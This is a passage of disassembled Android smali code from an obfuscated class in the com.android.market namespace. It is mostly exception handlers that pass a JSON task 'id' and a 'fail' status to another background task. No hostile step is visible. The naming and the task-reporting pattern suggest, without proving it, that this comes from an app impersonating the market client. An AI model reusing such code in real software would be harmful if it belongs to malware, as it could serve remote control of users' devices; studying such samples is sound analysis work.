    move-exception v0

    :try_start_37
    new-instance v1, Lcom/android/market/o;

    iget-object v0, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-direct {v1, v0}, Lcom/android/market/o;-><init>(Landroid/content/Context;)V

    const/4 v0, 0x2

    new-array v2, v0, [Ljava/lang/String;

    const/4 v0, 0x0

    const-string v3, "id"

    invoke-virtual {v8, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    aput-object v3, v2, v0

    const/4 v3, 0x1

    const-string v0, "fail"

    aput-object v0, v2, v3

    invoke-virtual {v1, v2}, Lcom/android/market/o;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_37
    .catch Lorg/json/JSONException; {:try_start_37 .. :try_end_37} :catch_14

    goto/16 :goto_0

    :catch_14
    move-exception v0

    goto/16 :goto_0

    :catchall_9
    move-exception v0

    :try_start_38
    new-instance v2, Lcom/android/market/o;

    iget-object v1, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-direct {v2, v1}, Lcom/android/market/o;-><init>(Landroid/content/Context;)V

    const/4 v1, 0x2

    new-array v3, v1, [Ljava/lang/String;

    const/4 v1, 0x0

    const-string v4, "id"

    invoke-virtual {v8, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    aput-object v4, v3, v1

    const/4 v4, 0x1

    const-string v1, "fail"

    aput-object v1, v3, v4

    invoke-virtual {v2, v3}, Lcom/android/market/o;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_38
    .catch Lorg/json/JSONException; {:try_start_38 .. :try_end_38} :catch_15

    :goto_2f
    throw v0

    :cond_20
    :try_start_39
    const-string v0, "fail"
    :try_end_39
    .catch Lorg/json/JSONException; {:try_start_39 .. :try_end_39} :catch_0

    goto/16 :goto_19

    :catch_15
    move-exception v1

    goto :goto_2f

    :catch_16
    move-exception v0

    goto/16 :goto_17

    :catch_17
    move-exception v1

    goto :goto_2e

    :catch_18
    move-exception v0

    goto/16 :goto_14

    :catch_19
    move-exception v1

    goto/16 :goto_2d

    :catchall_a
    move-exception v0

    goto/16 :goto_2b

    :catch_1a
    move-exception v0

    move v2, v7

    goto/16 :goto_29

    :catch_1b
    move-exception v0

    goto/16 :goto_12

    :catch_1c
    move-exception v1

    goto/16 :goto_28

    :catch_1d
    move-exception v0

    goto/16 :goto_10

    :catch_1e
    move-exception v1

    goto/16 :goto_27

    :catch_1f
    move-exception v0

    goto/16 :goto_d

    :catch_20
    move-exception v1

    goto/16 :goto_26

    :catchall_b
    move-exception v1

    move v2, v0

    move-object v0, v1

    goto/16 :goto_24

    :catch_21
    move-exception v1

    goto/16 :goto_22

    :catch_22
    move-exception v0

    goto/16 :goto_a

    :catch_23
    move-exception v1

    goto/16 :goto_21

    :catchall_c
    move-exception v0

    move v2, v1

    goto/16 :goto_1f

    :catch_24
    move-exception v0

    move v0, v1

    goto/16 :goto_1d

    :catch_25
    move-exception v0

    goto/16 :goto_7

    :catch_26
    move-exception v1

    goto/16 :goto_1c

    :catch_27
    move-exception v0

    goto/16 :goto_4

    :catch_28
    move-exception v1

    goto/16 :goto_1b

    :catch_29
    move-exception v0

    goto/16 :goto_1

    :catch_2a
    move-exception v1

    goto/16 :goto_1a

    :catch_2b
    move-exception v0

    goto/16 :goto_0

    :cond_21
    move v0, v2

    goto/16 :goto_e

    :cond_22
    move v0, v2

    goto/16 :goto_8

    :cond_23
    move v0, v2

    goto/16 :goto_5

    :cond_24
    move v0, v2

    goto/16 :goto_2
.end method

.method protected varargs synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 1

    check-cast p1, [Ljava/lang/String;

    invoke-virtual {p0, p1}, Lcom/android/market/m;->a([Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method
